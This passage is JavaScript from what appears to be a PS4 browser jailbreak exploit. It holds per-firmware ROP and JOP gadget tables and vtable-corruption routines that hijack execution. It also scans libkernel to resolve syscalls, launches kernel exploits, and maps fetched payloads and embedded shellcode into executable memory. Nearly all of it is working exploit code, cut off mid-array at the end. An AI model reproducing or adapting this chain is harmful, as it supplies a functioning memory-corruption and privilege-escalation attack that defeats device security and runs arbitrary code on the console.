			"__stack_chk_fail_libkernel": 0xD0D0,
			"memset": o2wk(0x140),
			"memset_libc": 0x37080,
		};
	} else if (window.ps4_fw >= 450 && window.ps4_fw <= 474) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_libkernel": 0xD190,
			"memset": o2wk(0x248),
			"memset_libc": 0x2AE10,
		};
	} else if (window.ps4_fw >= 500 && window.ps4_fw <= 507) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_libkernel": 0x11EC0,
			"memset": o2wk(0x228),
			"memset_libc": 0x225E0,
		};
	} else if (window.ps4_fw >= 550 && window.ps4_fw <= 553) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_libkernel": 0x12F70,
			"memset": o2wk(0x228),
			"memset_libc": 0x22F40,
		};
	} else if (window.ps4_fw >= 555 && window.ps4_fw <= 556) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_libkernel": 0x12F70,
			"memset": o2wk(0x228),
			"memset_libc": 0x22F50,
		};
	} else if (window.ps4_fw >= 600 && window.ps4_fw <= 620) {
		gadgets_temp = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_libkernel": 0x2D4A0,
			"memset": o2wk(0xE8), // malloc
			"memset_libc": 0xB4AD0, // malloc_libc
		};
	}
	
	var libSceLibcInternalBase = p.read8(p.get_jmptgt(gadgets_temp.memset));
	libSceLibcInternalBase.sub32inplace(gadgets_temp.memset_libc);
	if (p.read8(libSceLibcInternalBase) != 56415741E5894855)
		alert("Bad libSceLibcInternalBase: " + libSceLibcInternalBase);
	window.libSceLibcInternalBase = libSceLibcInternalBase;
	var o2lc = function (o) {
		return libSceLibcInternalBase.add32(o);
	}
	window.o2lc = o2lc;
	
	var libKernelBase = p.read8(p.get_jmptgt(gadgets_temp.__stack_chk_fail));
	libKernelBase.sub32inplace(gadgets_temp.__stack_chk_fail_libkernel);
	if (p.read8(libKernelBase) != 56415741E5894855)
		alert("Bad libKernelBase: " + libKernelBase);
	window.libKernelBase = libKernelBase;
	var o2lk = function (o) {
		return libKernelBase.add32(o);
	}
	window.o2lk = o2lk;
	
	if (window.ps4_fw == 315) {
		gadgets = {
			"memcpy": o2wk(0x148),
			"memset": o2wk(0x158),
			"memcmp": o2wk(0x178),
			"setjmp": o2wk(0x2A8),
			"sysctlbyname": o2lk(0xF9D0),
			"scePthreadCreate": o2lk(0x12500),
			"scePthreadJoin": o2lk(0x125A0),
			"sceKernelSleep": o2lk(0x134E0),
			"mov rdi, [rdi+0x48]": o2lc(0x64E12), // 3.15 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x17B9B),
			"add rax, [rdi]": o2lc(0x3B698), // 3.15 - 48 03 07 C3
		};
	} else if (window.ps4_fw >= 350 && window.ps4_fw <= 370) {
		gadgets = {
			"memcpy": o2wk(0x128),
			"memset": o2wk(0x138),
			"memcmp": o2wk(0x148),
			"setjmp": o2wk(0x2B8),
			"scePthreadCreate": o2lk(0x11E80),
			"scePthreadJoin": o2lk(0x11F20),
			"sceKernelSleep": o2lk(0x12E20), // 3.50-?3.70?
			"mov rdi, [rdi+0x48]": o2lc(0x8E982), // 3.50-3.55 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1773B),
			"add rax, [rdi]": o2lc(0x40B58), // 3.50-3.55 - 48 03 07 C3
		};
	} else if (window.ps4_fw >= 400 && window.ps4_fw <= 407) {
		gadgets = {
			"memcpy": o2wk(0x130),
			"memset": o2wk(0x140),
			"memcmp": o2wk(0x150),
			"setjmp": o2wk(0x270),
			"scePthreadCreate": o2lk(0x11570),
			"scePthreadJoin": o2lk(0x11610),
			"mov rdi, [rdi+0x48]": o2lc(0xA8282), // 4.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1702B),
			"add rax, [rdi]": o2lc(0x58978), // 4.05 - 48 03 07 C3
		};
	} else if (window.ps4_fw >= 450 && window.ps4_fw <= 455) {
		gadgets = {
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x248),
			"setjmp": o2wk(0x1468),
			"scePthreadCreate": o2lk(0x115C0),
			"scePthreadJoin": o2lk(0x11660),
			"sceKernelSleep": o2lk(0x12590),
			"mov rdi, [rdi+0x48]": o2lc(0xA1262), // 4.55-4.74 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1760B),
			"add rax, [rdi]": o2lc(0x4C418), // 4.55-4.74 - 48 03 07 C3
		};
	} else if (window.ps4_fw >= 470 && window.ps4_fw <= 474) {
		gadgets = {
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x248),
			"setjmp": o2wk(0x1468),
			"scePthreadCreate": o2lk(0x115C0),
			"scePthreadJoin": o2lk(0x11660),
			"mov rdi, [rdi+0x48]": o2lc(0xA1262), // 4.55-4.74 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1789B),
			"add rax, [rdi]": o2lc(0x4C418), // 4.55-4.74 - 48 03 07 C3
		};
	} else if (window.ps4_fw >= 500 && window.ps4_fw <= 507) {
		gadgets = {
			"memcpy": o2wk(0xF8),
			"memcmp": o2wk(0x208),
			"memset": o2wk(0x228),
			"setjmp": o2wk(0x14F8), // 5.00-5.55
			"scePthreadCreate": o2lk(0x98C0), // 5.01-5.05
			"scePthreadJoin": o2lk(0xE0C0),
			"mov rdi, [rdi+0x48]": o2lc(0xB00F2), // 5.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1EADB), // 5.01-5.05 - 48 29 C8 C3
			"add rax, [rdi]": o2lc(0x44DB8), // 5.05 - 48 03 07 C3
		};
	} else if (window.ps4_fw >= 550 && window.ps4_fw <= 556) {
		gadgets = {
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x228),
			"setjmp": o2wk(0x14F8), // 5.00-5.55
			"scePthreadCreate": o2lk(0x98C0), // 5.01-5.05
			"scePthreadJoin": o2lk(0xE0C0),
			"mov rdi, [rdi+0x48]": o2lc(0xB00F2), // 5.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1EADB), // 5.01-5.05 - 48 29 C8 C3
			"add rax, [rdi]": o2lc(0x44DB8), // 5.05 - 48 03 07 C3
		};
	} else if (window.ps4_fw >= 600 && window.ps4_fw <= 620) {
		gadgets = {
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x228),
			"setjmp": o2wk(0x14F8), // 5.00-5.55
			"scePthreadCreate": o2lk(0x98C0), // 5.01-5.05
			"scePthreadJoin": o2lk(0xE0C0),
			"mov rdi, [rdi+0x48]": o2lc(0xB00F2), // 5.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1EADB), // 5.01-5.05 - 48 29 C8 C3
			"add rax, [rdi]": o2lc(0x44DB8), // 5.05 - 48 03 07 C3
		};
	}
	
	// Resolve libSceWebKit2 gadgets
	window.resolve_webkit_offsets();
	if (window.gadgetcache) {
		for (var gadgetname in window.gadgetcache) {
			if (window.gadgetcache.hasOwnProperty(gadgetname))
				gadgets[gadgetname] = o2wk(window.gadgetcache[gadgetname]);
		}
	} else alert("no gadgetcache !!!");
	
	alert("setup ROP");
	
	// ROP execution wrappers
	if (window.ps4_fw >= 315 && window.ps4_fw <= 407) {
      var funcPtrStore = p.leakfunc(parseFloat);
      var funcArgs = [];

      for (var i = 0; i < 0x7FFF; i++)
        funcArgs[i] = 0x41410000 | i;

      /* Ensure everything is aligned and the layout is intact */
      var argBuffer = new Uint32Array(0x1000);
      var argPointer = p.read8(p.leakval(argBuffer).add32(window.leakval_slide));
      argBuffer[0] = 0x13371337;

      if (p.read4(argPointer) != 0x13371337)
        throw new Error("Stack frame is not aligned!");

      window.dont_tread_on_me = [argBuffer];

      /* Load ROP chain into memory */
      var launch_chain = function (chain) {
        var stackPointer = 0;
        var stackCookie = 0;
        var orig_reenter_rip = 0;

        var reenter_help = {
          length: {
            valueOf: function() {
              orig_reenter_rip = p.read8(stackPointer);
			  stackCookie = p.read8(stackPointer.add32(8));
              var returnToFrame = stackPointer;

              var ocnt = chain.count;
              chain.push_write8(stackPointer, orig_reenter_rip);
              chain.push_write8(stackPointer.add32(8), stackCookie);

              if (chain.runtime)
				  returnToFrame = chain.runtime(stackPointer);

              chain.push(window.gadgets["pop rsp"]);
              chain.push(returnToFrame); // -> back to the trap life
              chain.count = ocnt;

              p.write8(stackPointer, window.gadgets["pop rsp"]);
              p.write8(stackPointer.add32(8), chain.stackBase);
            }
          }
        };

        return (function() {
          /* Clear stack frame */
          (function(){}).apply(null, funcArgs);

          /* Recover frame */
          var orig = p.read8(funcPtrStore);
          p.write8(funcPtrStore, window.gadgets["mov rax, rdi"]);

          /* Setup frame */
          var trap = p.leakval(parseFloat());
          var rtv = 0;
          var fakeval = new int64(0x41414141, 0xffff0000);

          (function() {
            var val = p.read8(trap.add32(0x100));
            if ((val.hi != 0xffff0000) || ((val.low & 0xFFFF0000) != 0x41410000))
              throw new Error("Stack frame corrupted!");
          }).apply(null, funcArgs);

          /* Write vtable, setjmp stub, and 'jmp rax' gadget */
          p.write8(argPointer, argPointer.add32(0x100));
          p.write8(argPointer.add32(0x130), window.gadgets["setjmp"]);
          p.write8(funcPtrStore, window.gadgets["jop"]);

          /* Clear and write to frame */
          (function(){}).apply(null, funcArgs);
          p.write8(trap.add32(0x18), argPointer);
          p.leakval(parseFloat()); // Jumps to "setjmp" function stub in libkernel

          /* Finish by resetting the stack's base pointer and canary */
          stackPointer = p.read8(argPointer.add32(0x10));

          rtv = Array.prototype.splice.apply(reenter_help);
          p.write8(trap.add32(0x18), fakeval);
          p.write8(trap.add32(0x18), orig);

          return p.leakval(rtv);
        }).apply(null, funcArgs);
      }
	} else if (window.ps4_fw >= 450 && window.ps4_fw <= 556) {
		var hold1;
		var hold2;
		var holdz;
		var holdz1;

		while (1) {
			hold1 = { a: 0, b: 0, c: 0, d: 0 };
			hold2 = { a: 0, b: 0, c: 0, d: 0 };
			holdz1 = p.leakval(hold2);
			holdz = p.leakval(hold1);
			if (holdz.low - 0x30 == holdz1.low)
				break;
		}

		var pushframe = [];
		pushframe.length = 0x80;
		var rtv = 0;
		var funcbuf;
		var funcbuf32 = new Uint32Array(0x100);
		nogc.push(funcbuf32);

		var launch_chain = function (chain) {
			var stackPointer = 0;
			var stackCookie = 0;
			var orig_reenter_rip = 0;

			var reenter_help = {
				length: {
					valueOf: function () {
						orig_reenter_rip = p.read8(stackPointer);
						stackCookie = p.read8(stackPointer.add32(8));
						var returnToFrame = stackPointer;

						var ocnt = chain.count;
						chain.push_write8(stackPointer, orig_reenter_rip);
						chain.push_write8(stackPointer.add32(8), stackCookie);

						if (chain.runtime)
							returnToFrame = chain.runtime(stackPointer);

						chain.push(gadgets["pop rsp"]);
						chain.push(returnToFrame); // -> back to the trap life
						chain.count = ocnt;

						p.write8(stackPointer, gadgets["pop rsp"]);
						p.write8(stackPointer.add32(8), chain.stackBase);
					}
				}
			};
			
			funcbuf = p.read8(p.leakval(funcbuf32).add32(window.leakval_slide));

			p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
			p.write8(funcbuf.add32(0x80), gadgets["jop"]);
			p.write8(funcbuf, funcbuf);
			p.write8(parseFloatStore, gadgets["jop"]);
			var orig_hold = p.read8(holdz1);
			var orig_hold48 = p.read8(holdz1.add32(0x48));

			p.write8(holdz1, funcbuf.add32(0x50));
			p.write8(holdz1.add32(0x48), funcbuf);
			parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
			p.write8(holdz1, orig_hold);
			p.write8(holdz1.add32(0x48), orig_hold48);

			stackPointer = p.read8(funcbuf.add32(0x10));
			rtv = Array.prototype.splice.apply(reenter_help);
			return p.leakval(rtv);
		}
	} else if (window.ps4_fw >= 600 && window.ps4_fw <= 620) {
		var longjmp = 0xC1818; // libc offset
		var setjmp = 0xC179C; // libc offset
		var JOPGadgetOne = 0x6A9D0E; // webkit offset
		var JOPGadgetTwo = 0x18CD2D; // webkit offset
		var JOPGadgetThree = 0xCA74C2; // webkit offset
		
		// Construct a corrupted/fake vtable
		var vtableSize = 0x6E8 / 4;
		var fakeVtable = new Uint32Array(vtableSize);
		var originalVt = new Uint32Array(vtableSize);
		var context = p.malloc(0x100);
		var jopBuf = p.malloc(0x1000);
		var longJmpBuf = p.malloc(0x1000);
		
		var fakeVtableAddr = p.read8(p.leakval(fakeVtable).add32(window.leakval_slide));
		var originalVtAddr = p.read8(p.leakval(originalVt).add32(window.leakval_slide));
		
		// We'll copy the original vtable into our buffer and make a copy to restore when ROP chains are finished
		for (var i = 0; i < vtableSize; i++) {
			fakeVtable[i] = p.read8(textAreaVtable.add32(i * 4)).low;
			//fakeVtable[i] = p.read4(textAreaVtable.add32(i * 4));
			originalVt[i] = fakeVtable[i];
		}
		
		var launch_chain = function (chain) {
			// Construct ROP chain
			var ropStack = chain.stackBase;
			chain.push(window.gadgets["pop rdx"]);
			chain.push(context);
			chain.push(window.o2lc(longjmp));
			
			// Get current context
			fakeVtable[0x77] = window.o2lc(setjmp).hi;
			fakeVtable[0x76] = window.o2lc(setjmp).low;
			
			p.write8(textAreaVtPtr, fakeVtableAddr);
			
			// Run setjmp
			textArea.scrollLeft = 0x0;
			
			// Copy context for later
			for (var i = 0; i < 0x100; i += 8)
				p.write8(context.add32(i), p.read8(textAreaVtPtr.add32(i)));
			
			// Construct a JOP chain to call longjmp to pivot
			// JOP chain:
			//
			// JOP gadget 1: mov rax, qword [rdi+0x00000700] ; call qword [rax]
			// JOP gadget 2: mov rbx, qword [rax+0x000009A0] ; call qword [rax+0x998]
			// JOP gadget 3: mov rdx, rbx ; call qword [rax+0x10]
			
			// Write JOP gadget locations
			p.write8(jopBuf.add32(0x00), window.o2wk(JOPGadgetTwo)); // JOP gadget 2 - 0x18CD2D
			p.write8(jopBuf.add32(0x9A0), longJmpBuf); // Buffer for setting context
			p.write8(jopBuf.add32(0x998), window.o2wk(JOPGadgetThree)); // JOP gadget 3 - 0xCA74C2
			p.write8(jopBuf.add32(0x10), window.o2lc(longjmp)); // Call longjmp
			
			// We'll use the original context values then modify only the ones we need
			for (var i = 0; i < 0x100; i += 8)
				p.write8(longJmpBuf.add32(i), p.read8(context.add32(i)));
			
			p.write8(longJmpBuf.add32(0x00), window.gadgets["ret"]);
			p.write8(longJmpBuf.add32(0x10), ropStack); // RSP = ropStack
			p.write8(longJmpBuf.add32(0x18), ropStack); // RBP = ropStack
			
			// Set new context
			fakeVtable[0x77] = window.o2wk(JOPGadgetOne).hi;
			fakeVtable[0x76] = window.o2wk(JOPGadgetOne).low;
			
			p.write8(textAreaVtPtr, fakeVtableAddr);
			p.write8(textAreaVtPtr.add32(0x700), jopBuf);
			
			alert("scrollLeft");
			// Trigger JOP chain
			textArea.scrollLeft = 0x0;
			alert("after scrollLeft");
			
			// Restore old vtable
			for (var i = 0; i < vtableSize * 4; i += 8)
				p.write8(textAreaVtPtr.add32(i), p.read8(originalVtAddr.add32(i)));
			
			return 0;
		};
	}
	
	p.loadchain = launch_chain;
	
	var chain = new window.rop;
	var returnvalue;
	
	p.fcall_saved_rcx = p.malloc(8);
	
	p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
		chain.clear();

		//chain.notimes = this.next_notime;
		//this.next_notime = 1;

		chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
		
		chain.push(window.gadgets["pop rdi"]);
		chain.push(chain.stackBase.add32(0x3ff8));
		chain.push(window.gadgets["mov [rdi], rax"]);
		
		/*chain.push(window.gadgets["pop rax"]);
		chain.push(0);
		chain.push(window.gadgets["add rax, rcx"]);
		chain.push(window.gadgets["pop rdi"]);
		chain.push(p.fcall_saved_rcx);
		chain.push(window.gadgets["mov [rdi], rax"]);*/

		chain.push(window.gadgets["pop rax"]);
		chain.push(p.leakval(0x41414242));
		
		if (chain.run().low != 0x41414242)
			throw new Error("unexpected rop behaviour");
		returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
	};

	p.fcall = function () {
		var rv = p.fcall_.apply(this, arguments);
		return returnvalue;
	};
	
	alert("testing ROP exec");
	
	if (p.fcall(window.gadgets["mov rax, rdi"], 0x41414141) != 41414141)
		alert("userland ROP execution not working");
	else
		alert("userland ROP execution working");
	
	// Resolve syscalls, thanks to CelesteBlue and Specter
	const libkernel_size = 0x40000;
	var temp_buf = new Uint8Array(libkernel_size);
	const temp_buf_addr = p.read8(p.leakval(temp_buf).add32(window.leakval_slide));
	p.fcall(window.gadgets["memcpy"], temp_buf_addr, window.o2lk(0), libkernel_size);
	var dview32 = new Uint32Array(1);
	var dview8 = new Uint8Array(dview32.buffer);
	for (var i = 0; i < libkernel_size; i++) {
		if (temp_buf[i] == 0x48 && temp_buf[i + 1] == 0xC7 && temp_buf[i + 2] == 0xC0
		&& temp_buf[i + 7] == 0x49 && temp_buf[i + 8] == 0x89 && temp_buf[i + 9] == 0xCA
		&& temp_buf[i + 10] == 0x0F && temp_buf[i + 11] == 0x05) {
			dview8[0] = temp_buf[i + 3];
			dview8[1] = temp_buf[i + 4];
			dview8[2] = temp_buf[i + 5];
			dview8[3] = temp_buf[i + 6];
			const syscall_no = dview32[0];
			const syscall_offset = window.o2lk(i & 0xFFFFFFF0);
			window.syscalls[syscall_no] = syscall_offset;
		}
	}
	
	p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
		if (typeof sysc == "string")
			sysc = window.syscallnames[sysc];
			
		if (typeof sysc != "number")
			throw new Error("invalid syscall");

		var off = window.syscalls[sysc];
		if (off == undefined)
			throw new Error("undefined syscall number: " + sysc);

		return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
	};
	
	p.socket = function() {
		return p.syscall('sys_socket', 2, 1, 6); // 2 = AF_INET, 1 = SOCK_STREAM, 6 = TCP
	};

	p.connectSocket = function(s, ip, port) {
		var sockAddr = new Uint32Array(0x10);
		var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(window.leakval_slide));
		var ipSegments = ip.split('.');
		
		for (var seg = 0; seg < 4; seg++)
			ipSegments[seg] = parseInt(ipSegments[seg]);
		
		sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
		sockAddr[1] = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
		sockAddr[2] = 0;
		sockAddr[3] = 0;
		
		return p.syscall('sys_connect', s, sockAddrPtr, 0x10);
	};
	
	p.writeSocket = function(s, data, size) {
		return p.syscall('sys_write', s, data, size);
	};
	
	p.closeSocket = function(s) {
		return p.syscall('sys_close', s);
	};
	
	window.spawnthread = function (chain) {
		var contextp = p.malloc32(0x1800);
		var contextz = contextp.backing;
		contextz[0] = 1337;
		p.syscall("sys_mlockall", 1); // Needed else kpanic !
		var thread2 = new window.rop();
		//thread2.clear(); // maybe not needed
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		chain(thread2); // re-enter into |chain| which will set up thread chain
		p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget - longjmp will return into this
		p.write8(contextp.add32(0x10), thread2.stackBase); // rsp - longjmp pivots RSP to this, invoking the just created chain
		p.fcall(window.gadgets["createThread"], window.gadgets["longjmp"], contextp, p.stringify("GottaGoFast"));
		//var thread = p.malloc(0x08);
		//p.fcall(window.gadgets["scePthreadCreate"], thread, 0, window.gadgets["longjmp"], contextp, p.stringify("GottaGoFast"));
		window.nogc.push(contextp); // never free
		window.nogc.push(thread2);
		return thread2;
	};

	window.runPayload = function (path) {
		var req = new XMLHttpRequest();
		req.responseType = "arraybuffer";
		req.onreadystatechange = function () {
			if (req.readyState == 4) {
				try {
					var code_addr = new int64(0x26100000, 0x00000009);
					var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
					if (mapped_address != '926100000')
						throw "sys_mmap failed";
					
					// Trick for 4 bytes padding
					var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
					var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
					tmp.set(new Uint8Array(req.response), 0);
					tmp.set(padding, req.response.byteLength);
					
					var shellcode = new Uint32Array(tmp.buffer);
					for (var i=0; i < shellcode.length; i++)
						p.write4(code_addr.add32(0x100000 + i * 4), shellcode[i]);
					p.fcall(code_addr);
					p.syscall("sys_munmap", code_addr, 0x300000);
				} catch (e) {
					alert("exception: " + e);
				}
			}
		};
		req.open('GET', path);
		req.send();
	};

	window.try_dlsym = function() {
		var scratch32 = new Uint32Array(0x400);
		var scratch = p.read8(p.leakval(scratch32).add32(window.leakval_slide));
		var module_id = p.syscall("sys_dynlib_load_prx", p.stringify("libkernel_web.sprx"), 0, scratch, 0);
		alert("sys_dynlib_load_prx ret: " + module_id + ", scratch: " + p.read8(scratch));
		var sym = p.syscall("sys_dynlib_dlsym", p.read8(scratch), p.stringify("sceKernelLoadStartModule"), scratch);
		alert("sys_dynlib_dlsym ret: " + sym + ", scratch: " + p.read8(scratch));
		var sceKernelLoadStartModule = p.read8(scratch);
		alert(p.fcall(sceKernelLoadStartModule, p.stringify("libkernel_web.sprx"), 0, scratch.add32(0x40), 0, 0, 0));
	};
	
	window.try_sys_getcontext_leak = function() {
		var mem = p.malloc(0x500); // allocate buffer
		alert(p.hexdump(mem, 0x500)); // display
		
		p.syscall("sys_getcontext", mem); //trigger it
		alert(p.hexdump(mem, 0x500)); // display
		
		p.syscall("sys_getcontext", mem); //trigger it
		alert(p.hexdump(mem, 0x500)); // display
		
		p.syscall("sys_getcontext", mem); //trigger it
		alert(p.hexdump(mem, 0x500)); // display
	};
	
	window.try_sys_randomized_path_leak = function() {
		var mem = p.malloc(0x1000000); // allocate buffer
		alert(p.hexdump(mem, 0x500)); // display zeroed buffer
		
		var len_buf = p.malloc(0x08); // allocate length buffer
		p.write8(len_buf, new int64(0, 2147483648)); // write length: 0x8000000000000000
		alert(p.hexdump(len_buf, 8)); // display length
		
		alert(p.syscall("sys_randomized_path", 0, mem, len_buf)); // trigger bug
		alert(p.read8(p.fcall_saved_rcx));
		alert(p.hexdump(mem, 0x500)); // display buffer, should have been modified
	};
	
	// USERLAND CODE EXECUTION
	
	alert("userland exec");
	
	// Clear errno
	//p.write8(o2lk(0x893F0), 0); // 6.20
	
	if (window.ps4_fw <= 507)
		window.resolve_kernel_offsets();
	
	if (window.ps4_fw == 405)
		alert(getKernelBase_namedobj());
	
	//try_sys_getcontext_leak();
	//try_sys_randomized_path_leak();
	
	
	// Test if the kernel is already patched
	if (p.syscall("sys_setuid", 0) != 0) {
		alert("Launching kexploit");
		if (window.ps4_fw == 405)
			kernExploit_namedobj();
		else if (window.ps4_fw <= 455)
			kernExploit_bpf_race_old();
		else if (window.ps4_fw <= 455 && 0==1)
			kernExploit_bpf_race();
		else if (window.ps4_fw >= 400 && window.ps4_fw <= 507)
			kernExploit_bpf_double_free();
		else
			alert("No kernel exploit available for this FW");
	} else alert("Kexploit has already been ran. Continuing.");
	
	alert("kernel done");
	//sleep(500);
	var runPayload = window.runPayload;
	//try_dlsym();
	
	// Check mira status
	var testMira = p.syscall("sys_setlogin", p.stringify("root"));
	if (testMira == 0)
		alert("Mira is loaded");
	
	if (window.ps4_fw == 505) {
		//runPayload("kdumper.bin");
		//runPayload("ps4-hen-vtx-211-505.bin");
		runPayload("unblocker.bin");
		
		/*
		sleep(2000);
		runPayload("mira_505.bin");
		sleep(2000);
		// Test if payloads ran successfully, if not, refresh
		testMira = p.syscall("sys_setlogin", p.stringify("root"));
		if (testMira != '0') {
			alert("Mira failed to run !");
			//location.reload();
		}
		*/
		
		allset();
	} else if (window.ps4_fw == 501) {
		//runPayload("kdumper.bin");
		runPayload("ps4-hen-vtx-501.bin");
		//runPayload("unblocker.bin");
		
		allset();
	} else if (window.ps4_fw == 474) {
		//runPayload("kdumper.bin");
		runPayload("fake_installer.bin");
		//runPayload("unblocker.bin");
		
		allset();
	} else if (window.ps4_fw == 455) {
		//runPayload("kdumper.bin");
		//runPayload("ps4-hen-vtx-455.bin");
		runPayload("unblocker.bin");
		
		allset();
	} else if (window.ps4_fw == 405 && 0 == 1) {
		// Create payload memory
		var code_addr = new int64(0x26200000, 0x00000009);
		var buffer = p.syscall("sys_mmap", code_addr, 0x200000, 7, 0x1000, -1, 0);
		// Verify loaded
		if (buffer == '926200000') {
			// Clear payload memory area before run
			p.fcall(window.gadgets["memset"], code_addr, 0, 0x1FFFF8);

			// Write payload
			for (var i = 0; i < payload.length; i++)
				p.write4(code_addr.add32(i * 4), payload[i]);

			// Write syscall gadget
			p.write8(code_addr.add32(0x1FFFF8), window.o2lk(0x29C7));

			// Launch thread
			var thread_id_ptr = p.malloc(0x08);
			print("scePthreadCreate: 0x" + p.fcall(window.gadgets["scePthreadCreate"], thread_id_ptr, 0, code_addr, 0, p.stringify("payload")));
			
			print("thread: 0x" + p.read8(thread_id_ptr));
			alert("=== Done ===");
			allset();
		} else {
			print("Failed to allocate payload");
			print(buffer);
		}
	} else if (window.ps4_fw <= 307) {
		alert("bin2js payload");
		var code_addr = new int64(0x26100000, 0x00000009);
		var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
		if (buffer != '926100000')
			alert("error mmap");
		writeUnblocker(code_addr.add32(0x100000));
		p.fcall(code_addr);
		
		//runPayload("kdumper.bin");
		//runPayload("ps4-hen-vtx-455.bin");
		//runPayload("unblocker.bin");
		
		alert("allset");
		allset();
	} else if (window.ps4_fw <= 507) {
		var code_addr = new int64(0x26100000, 0x00000009);
		var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
		if (mapped_address != '926100000')
			alert("mmap failed");
		var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
		var shellbuf = p.malloc32(0x1000);
		for (var i = 0; i < shcode.length; i++)
			shellbuf.backing[i] = shcode[i];
		p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
		// run payloads forever
		for (;;) {
			// Clear payload memory area before each run
			//p.fcall(window.gadgets["memcpy"], code_addr.add32(0x100000), 0, 0x1FFFF8);
			var thread_id_ptr = p.malloc(0x08);
			var exit_code_ptr = p.malloc(0x08);
			var result = p.fcall(window.gadgets["scePthreadCreate"], thread_id_ptr, 0, shellbuf, 0, p.stringify("loader"));
			if (result == 0) {
				var thread_id = p.read8(thread_id_ptr);
				alert("=== Waiting for payload!!! ===");
				window.awaitpl();
				var result = p.fcall(window.gadgets["scePthreadJoin"], thread_id, exit_code_ptr);
				print("scePthreadJoin: 0x" + result);
				if (result == 0) {
					var exit_code = p.read8(exit_code_ptr);
					if (!confirm("exit code: " + exit_code + "\nAgain?"))
						break;
				}
			}
		}
	} else {
		// Load payload launcher
		var code_addr = new int64(0x26100000, 0x00000009);
		var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
		if (mapped_address == '926100000') {
			try {
				var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 